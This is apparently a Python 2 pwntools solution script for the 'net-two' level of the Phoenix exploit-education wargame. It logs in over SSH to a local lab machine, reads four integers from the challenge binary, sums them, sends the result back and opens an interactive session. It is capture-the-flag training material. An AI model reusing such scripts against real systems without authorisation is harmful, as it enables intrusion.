from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "net-two"

shell = ssh('user','localhost',port=2222,password='user')
conn = shell.process('/opt/phoenix/i486/{}'.format(challenge_name))

conn.recvlines(2)

res=0
for i in range(4):
	data = conn.recv(4)
	print data
	data = u32(data,sign='signed')
	print data
	res += int(data)
print "RESULT : ",res

conn.sendline(str(p32(res)))
conn.interactive()
conn.close()